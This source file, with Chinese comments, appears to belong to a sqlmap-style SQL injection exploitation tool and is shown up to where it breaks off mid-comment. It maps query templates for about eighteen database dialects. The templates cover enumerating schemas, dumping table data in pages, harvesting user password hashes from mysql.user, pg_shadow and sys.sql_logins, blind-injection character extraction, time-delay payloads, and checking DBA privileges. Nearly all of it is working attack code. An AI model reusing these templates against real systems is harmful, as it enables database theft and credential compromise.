// =====================================================================
// extractionMaps.js — Extractor 使用的各方言查询/函数映射表（从 Extractor.js 拆分）
// 包含：SYS_QUERIES / LEN_FN / SUB_FN / ASCII_FN / VERSION_EXPR / TIME_COND /
//       CURRENT_DB_EXPR / HOSTNAME_QUERY / ISDBA_QUERY / SCHEMA_QUERY /
//       PRIVILEGES_QUERY / ROLES_QUERY / CURRENT_USER_EXPR
//       SEARCH_COLUMNS_QUERY / SEARCH_TABLES_QUERY / COUNT_WHERE_QUERY
// 依赖 DialectSqlBuilder 的 escSql/escBacktick/escDq/escBracket/escCols
// =====================================================================
import {
  escSql, escBacktick, escDq, escBracket, escCols,
} from './DialectSqlBuilder.js';
import { versionAtLeast } from './dbmsVersion.js';

// 各库系统表查询模板（库/表/列/数据）
// 数据分隔符用控制字符 0x1F(列) / 0x1E(行)，替代原 '|' / '||'：业务数据几乎不会含控制字符，
// 避免字段值本身含 '|'（地址/备注极常见）导致解析错位。与 Exploiter.deepDump 的堆叠提取分隔符对齐。
// 列分隔符 SQL 常量：MySQL/SQLite=CHAR(31)，PG=CHR(31)，SQLServer=CHAR(31)，Oracle=CHR(31)
// 行分隔符 SQL 常量：MySQL/PG=CHAR(30)/CHR(30)，SQLServer=CHAR(30)，Oracle=CHR(30)
// [sqlmap 对标 --where] data 函数第六参数 where 为原始 SQL WHERE 子句（如 "id>100 AND name LIKE '%a%'"），
//   不对 WHERE 内容做转义（与 sqlmap --where 行为一致），仅由调用方确保安全性。

export const SYS_QUERIES = {
  MySQL: {
    databases: 'SELECT GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
    tables: (db) =>
      `SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
    columns: (db, table) =>
      `SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='${escSql(db)}' AND table_name='${escSql(table)}'`,
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      return 'SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ' + escCols(cols, 'MySQL') + ')) FROM `' + escBacktick(db) + '`.`' + escBacktick(table) + '`' + w + ' LIMIT ' + limit + ' OFFSET ' + offset;
    },
    // 凭据收割（对标 sqlmap --users/--passwords）：mysql.user 表需额外权限，查询失败由
    // enumerateUsers/enumeratePasswords 捕获并返回 null（不阻断主流程）。
    users: 'SELECT GROUP_CONCAT(CONCAT(user,0x40,host) SEPARATOR \',\') FROM mysql.user',
    // [P2-2] 密码哈希列按版本分支：MySQL 5.7+ 用 authentication_string（password 列已删除，
    // 引用即 Unknown column 报错）；<5.7 用 password（authentication_string 列不存在）。
    // 旧版 IFNULL(authentication_string,password) 在任何真实 MySQL 版本上都必然报错——
    // IFNULL 的两个参数列必须都存在。版本未知（null）→ 保守按 5.7+ 处理（现实存量主力）。
    passwords:
      'SELECT GROUP_CONCAT(CONCAT(user,0x40,host,0x3a,IFNULL(authentication_string,\'\')) SEPARATOR \',\') FROM mysql.user',
    // 版本 <5.7 的回退变体（resolveSysQueries 按版本选择，见文件尾部）
    passwordsLegacy:
      'SELECT GROUP_CONCAT(CONCAT(user,0x40,host,0x3a,IFNULL(password,\'\')) SEPARATOR \',\') FROM mysql.user',
  },
  PostgreSQL: {
    databases: 'SELECT string_agg(datname, \',\') FROM pg_database',
    // PostgreSQL 的 table_schema 是 schema 名（如 public），不是 database 名；
    // 忽略传入的 database 名，固定查 public，避免把 database 名当 schema 导致查空。
    tables: () =>
      `SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'`,
    columns: (db, table) =>
      `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}' AND table_schema='public'`,
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      return 'SELECT string_agg(CONCAT_WS(CHR(31), ' + escCols(cols, 'PostgreSQL') + '), CHR(30)) FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset;
    },
    // 凭据收割（对标 sqlmap --users/--passwords）：pg_shadow 需超级用户权限，失败返回 null。
    users: "SELECT string_agg(usename,',') FROM pg_user",
    passwords: "SELECT string_agg(usename||':'||passwd, ',') FROM pg_shadow",
  },
  SQLite: {
    databases: null,
    tables: () => "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
    columns: (db, table) => `SELECT group_concat(name) FROM pragma_table_info('${escSql(table)}')`,
    // SQLite 的 group_concat 仅接受单参数，列间用 ||CHAR(31)|| 拼接成单串后再聚合
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      return 'SELECT group_concat(' + escCols(cols, 'SQLite').replace(/,/g, ' || CHAR(31) || ') + ' , CHAR(30)) FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset;
    },
  },
  'SQL Server': {
    databases: 'SELECT string_agg(name, \',\') FROM sys.databases',
    tables: () => 'SELECT string_agg(table_name, \',\') FROM information_schema.tables',
    columns: (db, table) =>
      `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      // [P2-2 顺带修复] CONCAT → CONCAT_WS：CONCAT 不插入分隔符（列值会黏在一起，
      // 列拆分按 0x1F 必然错位）；CONCAT_WS(CHAR(31), ...) 才是列间分隔语义（2017+ 可用）
      return 'SELECT string_agg(CONCAT_WS(CHAR(31), ' + escCols(cols, 'SQL Server') + '), CHAR(30)) FROM [' + escBracket(table) + ']' + w + ' ORDER BY (SELECT NULL) OFFSET ' + offset + ' ROWS FETCH NEXT ' + limit + ' ROWS ONLY';
    },
    // 凭据收割（对标 sqlmap --users/--passwords）：sys.sql_logins 需高权限，失败返回 null。
    users: "SELECT string_agg(name,',') FROM sys.sql_logins",
    passwords:
      "SELECT string_agg(name+':'+master.dbo.fn_varbintohexstr(password_hash),',') FROM sys.sql_logins",
  },
  Oracle: {
    // Oracle 无"库"概念，用 all_users 枚举可访问的 schema（等价于数据库级枚举）；
    // 注：all_users 仅返回已授权 schema，dba_users 需更高权限（前者更通用）。
    databases: "SELECT listagg(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users",
    tables: () =>
      'SELECT listagg(table_name, \',\') WITHIN GROUP (ORDER BY table_name) FROM user_tables',
    columns: (db, table) =>
      `SELECT listagg(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='${escSql(table)}'`,
    // [P0-FIX] Oracle 分页：用 ROWNUM 子查询包装支持 offset 偏移，替代原 ROWNUM<= 单页限制。
    // 旧模板仅 'WHERE ROWNUM<=' + limit，忽略 offset 造成大表拖库只能取前 limit 行。
    // [sqlmap 对标 --where] 有 where 时 ROWNUM 用 AND 拼接（WHERE 已存在），无 where 时用 WHERE。
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      const base = `SELECT listagg(CONCAT(CHR(31), ${escCols(cols, 'Oracle')}), CHR(30)) FROM "${escDq(table)}"${w}`;
      if (offset > 0) {
        // 带偏移的分页：ROWNUM 两层包装（兼容 Oracle 9i+，无需 12c OFFSET FETCH）
        return `SELECT * FROM (SELECT t.*, ROWNUM rnum FROM (${base}) t WHERE ROWNUM <= ${offset + limit}) WHERE rnum > ${offset}`;
      }
      const rownumClause = where ? ` AND ROWNUM <= ${limit}` : ` WHERE ROWNUM <= ${limit}`;
      return `${base}${rownumClause}`;
    },
  },
};

// TiDB：MySQL 协议兼容，系统库 information_schema 结构与 MySQL 完全一致 -> 直接复用 MySQL 分支
SYS_QUERIES.TiDB = SYS_QUERIES.MySQL;
// DM8（达梦）：Oracle 兼容模式，数据字典为 user_tables / user_tab_columns / 系统视图 -> 复用 Oracle 分支
SYS_QUERIES.DM8 = SYS_QUERIES.Oracle;
// ClickHouse：非标准 system.* 系统表，用 system.databases / system.tables / system.columns 枚举
// ClickHouse 的 toString 函数把任意类型转为字符串，CHAR(31)/CHAR(30) 做列/行分隔符
SYS_QUERIES.ClickHouse = {
  databases: "SELECT groupArray(name) FROM system.databases",
  tables: (db) => `SELECT groupArray(name) FROM system.tables WHERE database='${escSql(db)}'`,
  columns: (db, table) => `SELECT groupArray(name) FROM system.columns WHERE database='${escSql(db)}' AND table='${escSql(table)}'`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT arrayStringConcat(groupArray(CONCAT(${escCols(cols, 'ClickHouse')})), CHAR(30)) FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}`;
  },
};

// DB2：用 SYSCAT 系统视图枚举（对标 mysql information_schema）
SYS_QUERIES.DB2 = {
  databases: "SELECT listagg(DB_NAME, ',') FROM TABLE(SYSPROC.ENV_GET_DB_INFO())",
  tables: () => "SELECT listagg(TABNAME, ',') FROM SYSCAT.TABLES WHERE TABSCHEMA NOT LIKE 'SYS%'",
  columns: (db, table) =>
    `SELECT listagg(COLNAME, ',') FROM SYSCAT.COLUMNS WHERE TABNAME='${escSql(table)}' AND TABSCHEMA NOT LIKE 'SYS%'`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT listagg(CONCAT(CHAR(31), ${escCols(cols, 'DB2')}), CHAR(30)) FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}`;
  },
};

// HSQLDB（D 方向，最小适配）：用 INFORMATION_SCHEMA 枚举，语法类 MySQL（GROUP_CONCAT/反引号）
SYS_QUERIES.HSQLDB = {
  databases: "SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.SYSTEM_SCHEMAS",
  tables: () => "SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC'",
  columns: (db, table) =>
    `SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${escSql(table)}'`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escCols(cols, 'HSQLDB')})) FROM \`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}`;
  },
};

// Derby（D 方向，最小适配）：用 SYS.SYSTABLES / SYS.SYSCOLUMNS 枚举
SYS_QUERIES.Derby = {
  databases: "SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1",
  tables: () => "SELECT GROUP_CONCAT(TABLENAME) FROM SYS.SYSTABLES WHERE TABLETYPE='T'",
  columns: (db, table) =>
    `SELECT GROUP_CONCAT(COLUMNNAME) FROM SYS.SYSCOLUMNS WHERE REFERENCEID=(SELECT TABLEID FROM SYS.SYSTABLES WHERE TABLENAME='${escSql(table)}')`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escCols(cols, 'Derby')}), CHAR(30)) FROM "${escDq(table)}"${w} OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`;
  },
};

// [⑭] 补全 6 库拖库字典（Sybase/Firebird/Informix/H2/Access/MonetDB）
// 原仅 11 库有 SYS_QUERIES（MySQL/PG/SQLite/MSSQL/Oracle/ClickHouse/DB2/HSQLDB/Derby
// + TiDB/DM8 别名），6 库缺失导致枚举/拖库降级为空。

// Sybase ASE：用 list() 聚合（ASE 15+），系统表 sysobjects/syscolumns
// CHAR(31)/CHAR(30) 在 ASE 中可用；分页用 TOP n START AT m（ASE 15.7+）
SYS_QUERIES.Sybase = {
  databases: "SELECT list(name) FROM master.dbo.sysdatabases",
  tables: () => "SELECT list(name) FROM sysobjects WHERE type='U'",
  columns: (db, table) =>
    `SELECT list(name) FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='${escSql(table)}')`,
  // [FIX] Sybase ASE 的 TOP / START AT 属于 SELECT 子句，必须紧跟 SELECT 而非放在 FROM 之后。
  // 旧模板拼成 `... FROM [table] WHERE ... TOP n START AT m`，在 ASE 上是语法错误（拖库必然失败）。
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    const agg = `list(CONCAT_WS(CHAR(31), ${escCols(cols, 'Sybase')}), CHAR(30))`;
    return offset > 0
      ? `SELECT TOP ${limit} START AT ${offset + 1} ${agg} FROM [${escBracket(table)}]${w}`
      : `SELECT TOP ${limit} ${agg} FROM [${escBracket(table)}]${w}`;
  },
};

// Firebird：用 list() 聚合（FB 2.1+），系统表 rdb$* 系列
// ASCII_CHAR() 是 Firebird 的控制字符函数（非 CHAR()）；分页用 ROWS m TO n
// databases=null：Firebird 是单库架构（一个数据库文件=一个库），无"枚举所有库"概念
SYS_QUERIES.Firebird = {
  databases: null,
  tables: () =>
    "SELECT list(rdb$relation_name) FROM rdb$relations WHERE rdb$system_flag=0 AND rdb$view_blr IS NULL",
  columns: (db, table) =>
    `SELECT list(rdb$field_name) FROM rdb$relation_fields WHERE rdb$relation_name='${escSql(table)}'`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT list(ASCII_CHAR(31) || ${escCols(cols, 'Firebird').replace(/,/g, ' || ASCII_CHAR(31) || ')}, ASCII_CHAR(30)) FROM "${escDq(table)}"${w} ROWS (${offset + 1}) TO (${offset + limit})`;
  },
};

// Informix：list() 聚合（IDS 12.10+），系统表 systables/syscolumns
// 控制字符问题：Informix 无 CHAR()/CHR() 函数，无法在 SQL 中生成 0x1F/0x1E
// -> data=null（不支持控制字符分隔的聚合提取，降级到逐行 UNION 或盲注）
SYS_QUERIES.Informix = {
  databases: "SELECT list(dbsname) FROM sysmaster:sysdatabases",
  tables: () =>
    "SELECT list(tabname) FROM systables WHERE tabtype='T' AND tabid > 99",
  columns: (db, table) =>
    `SELECT list(colname) FROM syscolumns WHERE tabid=(SELECT tabid FROM systables WHERE tabname='${escSql(table)}')`,
  data: null,
};

// H2：GROUP_CONCAT + CHAR()（与 HSQLDB 类似，H2 兼容 MySQL 语法）
SYS_QUERIES.H2 = {
  databases: "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
  tables: (db) =>
    `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
  columns: (db, table) =>
    `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escCols(cols, 'H2')})) FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}`;
  },
};

// Access：不支持 GROUP_CONCAT/LIST 等字符串聚合，无 information_schema，无 CHAR()/LIMIT
// 所有枚举返回 null（诚实降级，与 sqlmap 对 Access 的处理一致）
SYS_QUERIES.Access = {
  databases: null,
  tables: null,
  columns: null,
  data: null,
};

// MonetDB：group_concat + CHAR()（MonetDB 支持 group_concat 和 CHAR 函数）
SYS_QUERIES.MonetDB = {
  databases: "SELECT group_concat(name) FROM sys.schemas",
  tables: (db) =>
    `SELECT group_concat(name) FROM sys.tables WHERE schema_id=(SELECT id FROM sys.schemas WHERE name='${escSql(db)}')`,
  columns: (db, table) =>
    `SELECT group_concat(name) FROM sys.columns WHERE table_id=(SELECT id FROM sys.tables WHERE name='${escSql(table)}')`,
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT group_concat(CONCAT_WS(CHAR(31), ${escCols(cols, 'MonetDB')})) FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}`;
  },
};

// 各库盲注二分提取函数（LENGTH / SUBSTRING / ASCII 等方言变体）
// [⑯] 补全 10 库盲注二分函数（MariaDB/TiDB/DM8 经 resolveDbms 归一化到 MySQL/Oracle）
export const LEN_FN = {
  MySQL: (e) => `LENGTH((${e}))`,
  PostgreSQL: (e) => `LENGTH((${e}))`,
  SQLite: (e) => `LENGTH((${e}))`,
  'SQL Server': (e) => `LEN((${e}))`,
  Oracle: (e) => `LENGTH((${e}))`,
  ClickHouse: (e) => `length((${e}))`,
  Sybase: (e) => `len((${e}))`,
  DB2: (e) => `length((${e}))`,
  Firebird: (e) => `char_length((${e}))`,
  Informix: (e) => `length((${e}))`,
  H2: (e) => `length((${e}))`,
  Access: (e) => `len((${e}))`,
  HSQLDB: (e) => `length((${e}))`,
  Derby: (e) => `length((${e}))`,
  MonetDB: (e) => `length((${e}))`,
};
export const SUB_FN = {
  MySQL: (e, i) => `SUBSTRING((${e}),${i},1)`,
  PostgreSQL: (e, i) => `SUBSTRING((${e}) FROM ${i} FOR 1)`,
  SQLite: (e, i) => `SUBSTR((${e}),${i},1)`,
  'SQL Server': (e, i) => `SUBSTRING((${e}),${i},1)`,
  Oracle: (e, i) => `SUBSTR((${e}),${i},1)`,
  ClickHouse: (e, i) => `substring((${e}),${i},1)`,
  Sybase: (e, i) => `substring((${e}),${i},1)`,
  DB2: (e, i) => `substr((${e}),${i},1)`,
  Firebird: (e, i) => `substring((${e}) FROM ${i} FOR 1)`,
  Informix: (e, i) => `substr((${e}),${i},1)`,
  H2: (e, i) => `substring((${e}),${i},1)`,
  Access: (e, i) => `mid((${e}),${i},1)`,
  HSQLDB: (e, i) => `substring((${e}),${i},1)`,
  Derby: (e, i) => `substring((${e}) FROM ${i} FOR 1)`,
  MonetDB: (e, i) => `substring((${e}),${i},1)`,
};
export const ASCII_FN = {
  MySQL: (c) => `ASCII(${c})`,
  PostgreSQL: (c) => `ASCII(${c})`,
  SQLite: (c) => `UNICODE(${c})`,
  'SQL Server': (c) => `ASCII(${c})`,
  Oracle: (c) => `ASCII(${c})`,
  ClickHouse: (c) => `ascii(${c})`,
  Sybase: (c) => `ascii(${c})`,
  DB2: (c) => `ascii(${c})`,
  Firebird: (c) => `ascii_val(${c})`,
  Informix: (c) => `ascii(${c})`,
  H2: (c) => `ascii(${c})`,
  Access: (c) => `asc(${c})`,
  HSQLDB: (c) => `ascii(${c})`,
  Derby: (c) => `unicode(${c})`,
  MonetDB: (c) => `ascii(${c})`,
};

// 各库版本表达式（盲注提取证明用）
export const VERSION_EXPR = {
  MySQL: 'version()',
  PostgreSQL: 'version()',
  SQLite: 'sqlite_version()',
  'SQL Server': '@@version',
  Oracle: "(SELECT banner FROM v$version WHERE rownum=1)",
  // C/D 方向：无原生 version() 的库用常量串/版本视图回显标识（与 DB_VERSION 对齐）
  MariaDB: 'version()',
  TiDB: 'version()',
  DM8: "(SELECT banner FROM v$version WHERE rownum=1)",
  ClickHouse: 'version()',
  DB2: "'DB2'",
  Access: "'ACCESS'",
  HSQLDB: "'HSQLDB'",
  Derby: "'DERBY'",
  MonetDB: '(SELECT sys_version FROM sys.version)',
  // [⑭] 补全 4 库版本表达式
  Sybase: '@@version',
  Firebird: "(SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database)",
  Informix: "DBINFO('version', 'full')",
  H2: 'H2VERSION()',
};

// 时间盲注条件延迟表达式（condition 为真时触发 sleep，耗时高即判定为真）。
// 仅覆盖「有标量条件延迟原语」的基础方言；SQL Server 的 WAITFOR DELAY 是语句而非函数，
// 无法在 SELECT 表达式中使用（需堆叠），SQLite 无原生 sleep 函数，故两者返回 null ->
// 调用方降级布尔通道（诚实边界，与 sqlmap 对无延迟原语库的降级策略一致）。
// P2-P5：延迟秒数由调用方传入（config.timeBlindSleepSec，默认 2），替代硬编码 3s。
export const TIME_COND = {
  MySQL: (c, sec = 2) => `IF((${c}), SLEEP(${sec}), 0)`,
  PostgreSQL: (c, sec = 2) => `(CASE WHEN (${c}) THEN pg_sleep(${sec}) ELSE 0 END)`,
  Oracle: (c, sec = 2) => `(CASE WHEN (${c}) THEN dbms_pipe.receive_message('sqli',${sec}) ELSE 0 END)`,
  // [⑯] ClickHouse：sleep() 函数 + if() 三元表达式（CH 函数名小写）
  ClickHouse: (c, sec = 2) => `if((${c}), sleep(${sec}), 0)`,
  // [P1] H2：内建 SLEEP(ms)（{SLEEP}000 秒->毫秒），返回 0；CASE WHEN 条件延迟
  H2: (c, sec = 2) => `(CASE WHEN (${c}) THEN SLEEP(${sec}000) ELSE 0 END)`,
  // [P1] MonetDB：内建 sys.sleep(sec)（单位秒），返回 NULL/整数值因版本而异
  MonetDB: (c, sec = 2) => `(CASE WHEN (${c}) THEN sys.sleep(${sec}) ELSE 0 END)`,
  // Sybase/SQL Server 的 WAITFOR DELAY 是语句级，不能在 SELECT 表达式中使用 -> null（降级布尔通道）
  // Sybase 时间盲注检测走 PAYLOADS.Sybase.time 堆叠模板，数据提取降级布尔
  // [P1] 以下 6 库无可靠标量延时原语 -> null（诚实降级布尔通道）：
  // DB2：无内建 sleep/delay 函数（递归 CTE 等替代不可靠且版本依赖）
  DB2: null,
  // Firebird：无内建 sleep（PSQL 块循环需 EXECUTE PROCEDURE，非标量表达式）
  Firebird: null,
  // Informix：无内建 sleep（SYSTEM 需 OS 级调用，非标量表达式）
  Informix: null,
  // Access：Jet SQL 无任何延时原语
  Access: null,
  // HSQLDB：无内建 sleep（Java 存储过程需 ALIAS 注册，非标量表达式）
  HSQLDB: null,
  // Derby：无内建 sleep（Java 存储过程需 PROCEDURE，非标量表达式）
  Derby: null,
};

// 当前库名查询表达式（对标 sqlmap --current-db）：各方言裸标量表达式，extractScalar
// 通过 fromDummy 自动补 FROM dual / SYSIBM.SYSDUMMY1，故此表仅存裸表达式。
// SQLite 无会话库概念 -> null（currentDb 返回 null，诚实降级，与 sqlmap 边界一致）。
export const CURRENT_DB_EXPR = {
  MySQL: 'database()',
  MariaDB: 'database()',
  TiDB: 'database()',
  PostgreSQL: 'current_database()',
  SQLite: null,
  'SQL Server': 'DB_NAME()',
  Oracle: "SYS_CONTEXT('USERENV','DB_NAME')",
  DM8: "SYS_CONTEXT('USERENV','DB_NAME')",
  ClickHouse: 'currentDatabase()',
  DB2: 'CURRENT_SERVER',
  HSQLDB: 'CURRENT_CATALOG',
  Derby: 'CURRENT SCHEMA',
  Access: null,
  MonetDB: 'current_database()',
  // [⑭] 补全 4 库当前库名表达式
  Sybase: 'db_name()',
  Firebird: null, // 单库架构，无会话库概念
  Informix: "DBINFO('dbname')",
  H2: 'CURRENT_CATALOG',
};

// 枚举 hostname 查询表达式（对标 sqlmap --hostname）：各方言返回主机名/地址。
// SQLite 无概念 -> null，查询失败时返回 null（不阻断主流程）。
export const HOSTNAME_QUERY = {
  MySQL: 'SELECT @@hostname',
  PostgreSQL: "SELECT inet_server_addr()::text",
  'SQL Server': 'SELECT @@SERVERNAME',
  SQLite: null,
  Oracle: "SELECT SYS_CONTEXT('USERENV','HOST') FROM dual",
  ClickHouse: 'SELECT hostName()',
};
HOSTNAME_QUERY.MariaDB = HOSTNAME_QUERY.MySQL;
HOSTNAME_QUERY.TiDB = HOSTNAME_QUERY.MySQL;
HOSTNAME_QUERY.DM8 = HOSTNAME_QUERY.Oracle;
// [⑭] 补全 6 库 hostname 表达式
HOSTNAME_QUERY.Sybase = 'SELECT @@servername';
HOSTNAME_QUERY.Firebird = null; // 不暴露主机名
HOSTNAME_QUERY.Informix = "SELECT dbinfo('hostname')"; // fromDummy 补 FROM systables WHERE tabid=1
HOSTNAME_QUERY.H2 = null; // H2 无主机名函数
HOSTNAME_QUERY.MonetDB = 'SELECT value FROM sys.env() WHERE name=\'hostname\'';

// 枚举 is-dba 查询表达式（对标 sqlmap --is-dba）：各方言返回 1（是）或 0（否）。
// SQLite 无概念 -> null，查询失败时返回 null（不阻断主流程）。
export const ISDBA_QUERY = {
  MySQL: "SELECT IF(super_priv='Y',1,0) FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1) LIMIT 1",
  PostgreSQL: "SELECT CASE WHEN current_setting('is_superuser')='on' THEN 1 ELSE 0 END",
  'SQL Server': "SELECT IS_SRVROLEMEMBER('sysadmin')",
  SQLite: null,
  Oracle: "SELECT CASE WHEN length((SELECT privilege FROM session_privs WHERE privilege='CREATE ANY TABLE'))>0 THEN 1 ELSE 0 END FROM dual",
};
ISDBA_QUERY.MariaDB = ISDBA_QUERY.MySQL;
ISDBA_QUERY.TiDB = ISDBA_QUERY.MySQL;
ISDBA_QUERY.DM8 = ISDBA_QUERY.Oracle;
// [⑭] 补全 6 库 is-dba 表达式
ISDBA_QUERY.Sybase = "SELECT CASE WHEN charindex('sa_role', show_role())>0 THEN 1 ELSE 0 END";
ISDBA_QUERY.Firebird = null;
ISDBA_QUERY.Informix = null;
ISDBA_QUERY.H2 = null;
ISDBA_QUERY.MonetDB = null;

// 枚举 schema（表结构/列定义）查询表达式（对标 sqlmap --schema）：
// 返回列定义元数据（列名、类型、可空、默认值），行分隔符 CHAR(30)，列分隔符 CHAR(31)。
export const SCHEMA_QUERY = {
  MySQL: (db, table) =>
    `SELECT GROUP_CONCAT(COLUMN_NAME,CHAR(31),COLUMN_TYPE,CHAR(31),IS_NULLABLE,CHAR(31),IFNULL(COLUMN_DEFAULT,'NULL') SEPARATOR CHAR(30)) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='${escSql(db)}' AND TABLE_NAME='${escSql(table)}'`,
  PostgreSQL: (db, table) =>
    `SELECT string_agg(column_name||' '||data_type||CASE WHEN character_maximum_length IS NOT NULL THEN '('||character_maximum_length||')' ELSE '' END, CHR(30)) FROM information_schema.columns WHERE table_name='${escSql(table)}' AND table_schema='public'`,
  'SQL Server': (db, table) =>
    `SELECT string_agg(CONCAT(COLUMN_NAME,CHAR(31),DATA_TYPE,CHAR(31),IS_NULLABLE,CHAR(31),ISNULL(COLUMN_DEFAULT,'NULL')), CHAR(30)) FROM information_schema.columns WHERE table_name='${escSql(table)}' AND TABLE_SCHEMA='dbo'`,
  SQLite: (table) =>
    `SELECT group_concat(name||' '||type) FROM pragma_table_info('${escSql(table)}')`,
  Oracle: (db, table) =>
    `SELECT listagg(column_name||' '||data_type, CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='${escSql(table)}'`,
  ClickHouse: (db, table) =>
    `SELECT arrayStringConcat(groupArray(CONCAT(toString(name),CHAR(31),toString(type))), CHAR(30)) FROM system.columns WHERE database='${escSql(db)}' AND table='${escSql(table)}'`,
};
SCHEMA_QUERY.MariaDB = SCHEMA_QUERY.MySQL;
SCHEMA_QUERY.TiDB = SCHEMA_QUERY.MySQL;
SCHEMA_QUERY.DM8 = SCHEMA_QUERY.Oracle;

// 枚举用户权限查询表达式（对标 sqlmap --privileges）
export const PRIVILEGES_QUERY = {
  MySQL: `SELECT GROUP_CONCAT(PRIVILEGE_TYPE) FROM information_schema.user_privileges WHERE GRANTEE=CONCAT("'",SUBSTRING_INDEX(CURRENT_USER(),'@',1),"'@'",SUBSTRING_INDEX(CURRENT_USER(),'@',-1),"'")`,
  PostgreSQL: "SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user",
  'SQL Server': "SELECT string_agg(permission_name,',') FROM fn_my_permissions(NULL, 'DATABASE')",
  SQLite: null,
  Oracle: "SELECT listagg(privilege,',') WITHIN GROUP (ORDER BY privilege) FROM session_privs",
};
PRIVILEGES_QUERY.MariaDB = PRIVILEGES_QUERY.MySQL;
PRIVILEGES_QUERY.TiDB = PRIVILEGES_QUERY.MySQL;
PRIVILEGES_QUERY.DM8 = PRIVILEGES_QUERY.Oracle;

// 枚举角色查询表达式（对标 sqlmap --roles）
export const ROLES_QUERY = {
  MySQL: `SELECT GROUP_CONCAT(GRANTEE) FROM information_schema.user_privileges WHERE GRANTEE LIKE CONCAT('%',SUBSTRING_INDEX(CURRENT_USER(),'@',1),'%')`,
  PostgreSQL: "SELECT string_agg(rolname,',') FROM pg_roles",
  'SQL Server': "SELECT string_agg(name,',') FROM sys.database_principals WHERE type='R'",
  SQLite: null,
  Oracle: "SELECT listagg(role,',') WITHIN GROUP (ORDER BY role) FROM session_roles",
};
ROLES_QUERY.MariaDB = ROLES_QUERY.MySQL;
ROLES_QUERY.TiDB = ROLES_QUERY.MySQL;
ROLES_QUERY.DM8 = ROLES_QUERY.Oracle;

// 当前用户查询表达式（对标 sqlmap --current-user）：SQLite 无会话用户概念 -> 模拟常量。
export const CURRENT_USER_EXPR = {
  MySQL: 'current_user()',
  MariaDB: 'current_user()',
  TiDB: 'current_user()',
  PostgreSQL: 'current_user',
  SQLite: "'sqlite_user'",
  'SQL Server': 'SUSER_SNAME()',
  Oracle: 'USER',
  DM8: 'USER',
  ClickHouse: 'currentUser()',
  DB2: 'SESSION_USER',
  HSQLDB: 'CURRENT_USER',
  Derby: 'CURRENT_USER',
  Access: "'access_user'",
  MonetDB: 'current_user',
  // [⑭] 补全 4 库当前用户表达式
  Sybase: 'user_name()',
  Firebird: 'CURRENT_USER',
  Informix: 'USER',
  H2: 'CURRENT_USER',
};

// ============================================================================
// [sqlmap 对标 --search] 跨库搜索列名/表名查询模板
// 返回 "db.table.column" 或 "db.table" 逗号分隔串，由 Extractor.searchColumns /
// searchTables 拆分后返回。searchTerm 单引号已转义（escSql），支持 LIKE 模式匹配。
// MySQL/PG/MSSQL 用 information_schema，Oracle 用 all_tab_columns/all_tables，
